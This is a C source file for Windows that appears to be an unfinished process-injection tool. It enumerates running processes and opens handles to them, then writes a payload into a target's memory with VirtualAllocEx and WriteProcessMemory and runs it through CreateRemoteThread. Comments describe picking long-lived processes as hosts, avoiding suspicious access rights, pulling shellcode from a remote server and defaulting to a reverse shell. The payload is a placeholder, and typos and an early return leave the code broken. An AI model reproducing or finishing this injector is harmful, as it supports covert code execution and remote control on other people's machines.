
#include "PI.h"


void	printListInfos(t_list_infos *list) {
	t_pinfo	*head_tmp = list->head;
	while (head_tmp) {
		printf("processId: %d, handleAddress: 0x%p\n", head_tmp->pid, head_tmp->HProcess);
		head_tmp = head_tmp->next;
	}
}


t_list_infos	*getProcessesList() {
	int ownPid = _getpid();



	size_t lpidProcessSize = 1024;
	DWORD *lpidProcesses = (DWORD*)malloc(sizeof(DWORD) * lpidProcessSize);
	DWORD processesReturned;

	if (!EnumProcesses(lpidProcesses, sizeof(DWORD) * 1024, &processesReturned)) {
		printf("Couldn't fetch processes running on the machine, Error code %lx\n", GetLastError());
		free(lpidProcesses);
		return NULL;
	}

	int jumper = -1;
	int usefullProcesses = 0;
	t_list_infos *listInfos = (t_list_infos*)malloc(sizeof(t_list_infos));
	t_pinfo *processInfo;
	listInfos->head = NULL;
	listInfos->tail = NULL;
	while (++jumper < processesReturned / sizeof(DWORD)) {
		// better safe than sorry :)
		if (lpidProcesses[jumper] && lpidProcesses[jumper] != ownPid) {
			HANDLE HProcess;

			if (!(HProcess = OpenProcess(
					PROCESS_CREATE_THREAD|
					PROCESS_VM_WRITE|
					PROCESS_VM_OPERATION|
					PROCESS_QUERY_INFORMATION,
					FALSE,
					lpidProcesses[jumper]
				)))
				continue;
			processInfo = (t_pinfo*)malloc(sizeof(t_pinfo));

			// timings to use a process that was up for a long time, that might be a good condidat for injecting, cause it might stay up for a long moment.
			if(!(GetProcessTimes(
					Hprocess,
					&(processInfo->PCreationTime),
					&(processInfo->PExitTime),
					&(processInfo->PKernelTime),
					&(processInfo->PUserTime)
				))) {
				free(processInfo);
				printf("Couldn't get process %d times, Error: %lx", lpidProcesses[jumper], GetLastError());
				continue;
			}
			processInfo->pid = lpidProcesses[jumper];
			processInfo->HProcess = HProcess;
			processInfo->next = NULL;
			processInfo->time64 = processInfo->PcreationTime->dwHighDateTime;
			processInfo->time64 = processInfo->time64 << 32 | processInfo->PcreationTime->dwLowDateTime;

			if (!listInfos->head && !listInfos->tail) {
				listInfos->head = processInfo;
				listInfos->tail = processInfo;
			}
			listInfos->tail->next = processInfo;
			listInfos->tail = processInfo;

		}
	}

	return listInfos;
}

int		main(int argc, char** argv) {


	t_list_infos *currentProcessesList;
	while (!(currentProcessesList = getProcessesList()));

	printListInfos(currentProcessesList);

	return EXIT_SUCCESS;

	// now we get list of all process we can go throught it and try to inject untill we succed, but
	// when we inject we need to monitor that process so when it dies, we get another snapshot and we repeat.
	// also the payload should no be static so i need to find a way to send the shellcode from node server or something.
	// and trigger another snapshot and injection, but by default a reverse shell will do !

	char *payload = "\x69\x69";
	size_t payloadSize = sizeof(payload);


	HANDLE HProcess = NULL;
	int pid = atoi(argv[1]);

	// PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION
	// Need to use the above permissions ! ALL_ACCESS is to suspecious.
	if (!(HProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid))) {
		printf("Couldn't get access to the provided process id, Error code %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	LPVOID VMPointer = NULL;

	if (!(VMPointer = VirtualAllocEx(HProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		printf("Couldn't reserve/alloc memory in process virtualAddress, Error code %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("HProcess : 0x%p\nVMPointer : 0x%p\n", HProcess, VMPointer);

	SIZE_T dataWritten = 0;
	boolean wasDelivered = FALSE;

	if (!(wasDelivered = WriteProcessMemory(HProcess, VMPointer, payload, payloadSize, &dataWritten))) {
		printf("Couldn't deliver the playload, Error code %lx\n", GetLastError());
		// need to brut-force !
		return EXIT_FAILURE;
	}

	if (dataWritten != payloadSize) {
		printf("Payload wasn't written in its entirety, payloadSize: %ud, dataWritten: %ud\n", payloadSize, dataWritten);
	}
	
	printf("payloadSize: %zu, dataWritten: %zu\n", payloadSize, dataWritten);

	HANDLE HThread = NULL;

	DWORD dwThreadId = 0;

	if (!(HThread = CreateRemoteThread(HProcess, NULL, 0, (LPTHREAD_START_ROUTINE)VMPointer, NULL, 0, &dwThreadId))) {
		printf("Couldn't summon a thread. to execute the payload, %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("Thread was summoned correctly with id : %ud\n", dwThreadId);

	return EXIT_SUCCESS; 
}